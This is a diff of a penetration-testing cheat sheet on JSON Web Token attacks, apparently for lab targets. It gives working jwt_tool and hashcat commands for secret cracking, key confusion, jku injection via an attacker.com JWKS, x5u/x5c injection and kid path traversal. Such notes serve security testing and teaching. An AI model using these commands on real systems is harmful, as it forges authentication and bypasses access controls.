@@ -50,23 +50,66 @@ curl -H "Authorization: Bearer <MODIFIED_JWT>" http://10.10.10.10/api
 
 ### Signature Forgery with Weak Secrets
 
-Brute-force a weak secret with John the Ripper:
+HS256 tokens signed with short or dictionary secrets crack fast with hashcat mode 16500:
 
 ```bash
-echo "<JWT_SECRET>" > jwt_secret.txt
-john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt_secret.txt
+echo "<JWT>" > jwt.txt
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
 ```
 
-### Key Confusion Attack
-
-If the server accepts public keys for verification, attempt to sign the JWT with a known key:
+Once cracked, forge a new token with any claims:
 
 ```bash
-jwt_tool -I -S rsa256 -pk mypublic.pem
+jwt_tool <JWT> -S hs256 -p "<cracked_secret>"
 ```
 
-- `-I` → Interactively modifies the JWT.
-- `-S rsa256` → Uses the RSA256 signing algorithm.
+### Key Confusion Attack (RS256 → HS256)
+
+If the server accepts the algorithm field from the header, swap `RS256` to `HS256` and sign with the RSA public key as the HMAC secret — the server will "verify" using the public key it trusts, producing a valid signature.
+
+Grab the public key (commonly exposed at `/jwks.json`, `/.well-known/jwks.json`, or the JWT's `jku`):
+
+```bash
+curl -s http://10.10.10.10/.well-known/jwks.json
+```
+
+Forge with jwt_tool:
+
+```bash
+jwt_tool <JWT> -X k -pk public.pem
+```
+
+### jku Header Injection
+
+If the server honors the `jku` (JWK Set URL) header to fetch the verification key, point it at an attacker-hosted JWKS and sign with the matching private key:
+
+```bash
+jwt_tool <JWT> -X s -ju http://attacker.com/jwks.json
+```
+
+The server fetches the attacker JWKS, pulls the attacker's public key, and validates the attacker-signed token. Works when the server doesn't pin or allowlist the jku host.
+
+### x5u / x5c Header Injection
+
+Similar to jku but references an X.509 cert chain. Same bypass — the server trusts a cert URL or embedded cert it shouldn't:
+
+```bash
+jwt_tool <JWT> -X x -pc attacker.crt -pk attacker.key
+```
+
+### kid Path Traversal / SQL Injection
+
+The `kid` header selects a verification key by ID. If the server uses it in a file path or SQL query, inject:
+
+```json
+{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
+```
+
+Signing key becomes an empty file, so you can sign with an empty HMAC secret:
+
+```bash
+jwt_tool <JWT> -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""
+```
 
 ### Token Expiry Manipulation
 
